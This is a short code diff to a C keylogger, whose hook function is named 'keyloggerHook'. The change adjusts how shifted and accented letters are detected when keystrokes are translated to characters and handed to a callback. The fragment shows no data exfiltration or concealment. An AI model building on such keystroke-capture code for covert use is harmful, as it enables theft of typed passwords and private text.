@@ -28,6 +28,12 @@ int getKeyName(u32 vkCode, char* buffer, u32 size) {
 void dictionary(u32 key) {
     memset(chr, 0, 65);
     u8 test = MapVirtualKeyEx(key, 2, GetKeyboardLayout(0)); //MAPVK_VK_TO_CHAR
+    if ((test >= 0x41 && test <= 0x5A) || (test >= 0x61 && test <= 0x7A) ||
+        (test >= 0x80 && test <= 0x87 && test != 0x83 && test != 0x85) ||
+        (test >= 0x8E && test <= 0x90) || test == 0x99 || test == 0x9A ||
+        test == 0x94 || test == 0xA4 || test == 0xA5) {
+        keyAfterShift = 1;
+    }
     if ((test >= 0x20 && test <= 0xFE) && test != 0x7F) { //Check if is printable
         u8 isCap = 0;
         if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
@@ -73,7 +79,6 @@ LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
                 rShiftPressed = 1;
                 keyAfterShift = 0;
             } else {
-                keyAfterShift = 1;
                 dictionary(key->vkCode);
                 callback(chr);
             }
